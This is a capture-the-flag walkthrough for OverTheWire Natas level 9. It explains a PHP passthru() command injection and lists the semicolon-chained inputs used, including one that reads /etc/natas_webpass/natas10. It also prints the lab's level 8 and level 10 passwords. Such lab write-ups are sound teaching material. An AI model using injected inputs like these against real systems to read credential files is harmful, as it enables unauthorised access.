# Natas CTF Solutions  

## Natas Level 9  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit the **command injection vulnerability** to execute arbitrary commands.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas9.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas9`  
- **Password:** Use the password from Natas Level 8:  
```
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```  
![Home_Page](https://github.com/user-attachments/assets/ea647b62-59f2-426c-b5d8-d9508b0cea42)

---

### **Step 3: Analyze the Webpage**  
- The page contains a **single input field**.
- Viewing the **page source** reveals that input is processed using the `passthru()` PHP function.
![Page_Source](https://github.com/user-attachments/assets/381d399a-7826-4a0c-ae72-74c3d881b4ab)

---

### **Step 4: Understanding Command Injection**  
The **`passthru()`** function in PHP executes system commands. This means we might be able to **inject commands** by appending a **semicolon (`;`)** to execute additional commands.

For example:
```bash
xxxx dictionary.txt; id
```
This command:
1. Runs the default search.
2. Executes `id`, which prints the **user and group ID**.
![Command_Execution](https://github.com/user-attachments/assets/92a8a20e-440f-40e8-bad6-af6ec95ee2d7)

---

### **Step 5: Extracting the Password**  
Since we know that **passwords are stored in `/etc/natas_webpass/natasX`**, we can retrieve the password for the next level by injecting:
```bash
xxxx dictionary.txt; cat /etc/natas_webpass/natas10
```
This command:
1. Runs the default search (`xxxx dictionary.txt`).
2. Uses **`cat`** to print the password file.
![Command](https://github.com/user-attachments/assets/592995e4-1c3c-4bc9-8172-5472bb38a585)

---

### **✅ Password for Natas Level 10**  
```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

---

## 💡 **Lessons Learned**  
✔️ **Command Injection Basics**  
- The `passthru()` function allows **direct command execution**.  
- **Using `;` (semicolon) lets us chain multiple commands**.

✔️ **Bypassing Input Validation**  
- If input isn't sanitized properly, **arbitrary commands can be executed**.  
- Always check **source code** for potential vulnerabilities.

✔️ **Linux Command Chaining**  
- `cat /etc/natas_webpass/natas10` lets us **read the password file**.  
- Other commands like `ls`, `whoami`, and `id` can be useful for **information gathering**.

---

## 🎮 **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Viewing Page Source | ![Page_Source](https://github.com/user-attachments/assets/381d399a-7826-4a0c-ae72-74c3d881b4ab) |  
| Step 5 – Executing Command Injection | ![Command_Execution](https://github.com/user-attachments/assets/92a8a20e-440f-40e8-bad6-af6ec95ee2d7) |  
| Step 6 – Retrieving the Password | ![Command](https://github.com/user-attachments/assets/592995e4-1c3c-4bc9-8172-5472bb38a585) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 10**:  
👉 [http://natas10.natas.labs.overthewire.org](http://natas10.natas.labs.overthewire.org)  

---
